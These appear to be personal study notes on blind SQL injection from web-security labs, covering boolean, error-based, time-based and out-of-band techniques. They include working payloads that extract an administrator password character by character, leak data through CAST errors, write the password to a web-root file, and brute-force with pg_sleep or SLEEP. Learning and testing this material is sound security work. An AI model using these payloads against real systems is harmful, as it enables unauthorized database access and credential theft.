can't extract info because the application doesn't return SQL data or
descriptive errors.

yet they could be exploited to get unauthorized data.

Examine:

send SQLi payloads and observe the behavior:

  * boolean based: injecting test conditions that return either true or false;
  slowly inferring the structure of the database.

  * time based: focusing on response time difference of different payloads by
  triggering a time delay. if the delay occurs means the query worked.
	
  - trigger an out of band network interaction

Exploit:

exfiltration:

store info somewhere on the local machine:

`SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt'`

then request the file: `https://example.com/output.txt`


it's http responses do not contain the results of the relevant SQL query or the
details of db errors.

## exploit by triggering conditional responses

when application uses *tracking cookies* the application uses a SQL query to
determine if this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

the results aren't returned to the user. but the application behaves
differently depending on the returned data. e.g. it might show a welcome back
message.

How to:

Using and `AND` condition, if it's true, the expected action would happen (a
welcome message will be displayed), other wise, it's not true.

`TrackingId=EGsveqHgcMpxwCB8' AND '1'='1;` this returns a welcome back message
`TrackingId=EGsveqHgcMpxwCB8' AND '1'='2;` this doesn't

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

this return a welcome back message indicating that the first character of
password is greater than `m`.

use `' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--` to determine if the `users`
table exists. the rest will always be true, (a=a).

`LIMIT 1` because it cannot compare a set of results (multiple rows) to
a single value.

## bruteforce

Using SUBSTRING:

`SELECT SUBSTRING(password,{index},1) FROM users WHERE USERNAME='administrator') = '{c}' --`

you should check every index, one by one for the new character, not the appended value.

## Error-based SQL injection

use error messages to either extract or infer sensitive data from the database.
The possibilities depend on the configuration of the database and the types of
errors you're able to trigger.

### Exploiting blind SQL injection by triggering conditional errors

there are SQL queries but the app's behavior doesn't change, even if they return data.

so injecting boolean conditions (like previous part) doesn't change the app's responses.

induce a response depending on whether a SQL error occurs. modify the query to cause a database error on TRUE.

`xyz' AND (SELECT CASE WHEN (1=2) THEN ELSE 'a' END)='a`

`CASE` evaluates to `a`, no error.

`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

evaluates to `1/0`, which causes a divide-by-zero error.

`lzjS7' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) = 'a'--`

    * `TO_CHAR` makes both branch conditions the same.
    * `END FROM dual` is also necessary in oracle:
        * `DUAL` is a sort of dummy table with one row in every oracle db.
        * `END` is the closing part of the condition.

to check the password length:

`' AND (SELECT CASE WHEN LENGTH(password) > 10 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--`

notice that the error means the condition is true. you can change it too.


so we can use injected conditions to retrieve data, testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

AND the result of the subquery = 'a'.
subquery: if the first index is greater that 'm'.

### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages that can contain useful information.

`CAST((SELECT example_column FROM example_table) AS int)` converts data types, if it's an incompatible type (string -> int) might cause an error, which could be useful to trigger *conditional responses*.

if there is a *character limitation*, you can't use too verbose (long?) queries.

HOW TO:

* commenting helps with eliminating the closing *quotation* that already exist
  in the application's code.

test it:

`' AND CAST((SELECT 1) AS INT) --` returns an error, because it expects a boolean, 1=1 (true)

`' AND 1=CAST((SELECT 1) AS INT) --` is true, so no error returned

`' AND 1=CAST((SELECT "abc") AS INT) --` error, returning `"abc"` because 

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --`

remove the cookie because it's not needed and leaves us more characters.

`LIMT 1` so that it doesn't show too many rows.

AND we get an error: invalid input syntax for type integer: "administrator"

so we get the idea to : `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`

using this stuff, you can get `version()` and all.


ERROR indicating *character limit*:

Unterminated string literal started at position 95 in SQL SELECT * FROM
tracking WHERE id = 'hyPr13PYPcOYmG05' AND CAST((SELECT password FROM users
where'. Expected  char

## by triggering time delays

in case of a database error, when the SQL query is executed and handles them
gracefully, there won't be any difference in the application's response

but, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

delaying the execution of a SQL query also delays the http response.

MS SQL:
trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--`

Postgres sql:

`' || pg_sleep(10) --`

`||` is to concatenate the function to the query so that the function is called.


to move toward bruteforcing the  password:

`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(0) END)--`

if true sleep, otherwise don't

you might be able to use `;` instead of `||` to end the previous query and
start a new one.

`("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`
if the first index of the password is `c`, sleep, otherwise return immediately.
this doesn't have to be url encoded.

`'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTR(password,§1§,1)+%3d+'§a§')++THEN+pg_sleep(10)+else+pg_sleep(0)+END+FROM+users--`
`"32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c`

something like this also works in burpsuite but should be url encoded

### another example, natas17

this is the code, that get a query for `MySQL`:

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

but in the rest of the code, the result isn't returned.

payload:

`natas18" AND IF((1=1),SLEEP(10),'a')#`

the `a` is the else part.

if natas18 is there, response will be delayed.

to get the included characters in the password:
in code: ``username := fmt.Sprintf(`natas18" AND IF(password LIKE BINARY "%%%c%%", SLEEP(10), 1)#`, c)``


% is used for formatting in Go, you need to escape it, which results in the
final query having %c%.
`%c%` in LIKE clause: wild card in SQL, meaning "any sequence of characters".

so it will be like this before sent to the server:
`natas18" AND IF((password LIKE BINARY "%S%"),SLEEP(10),"1")#`

and then to get the actual password, use `SUBSTR`.

## using out-of-band techniques

an app could carry out an SQL query *asynchronously*.

it uses the original thread to process the user's *request* and another to execute the query using the tracking cookie.

the app doesn't wait for the SQL query to return, it's response to user doesn't depend on it, be it an error or the delay.

the query could be vulnerable, but how do we know?

triggering the server to send DNS lookup query to our server.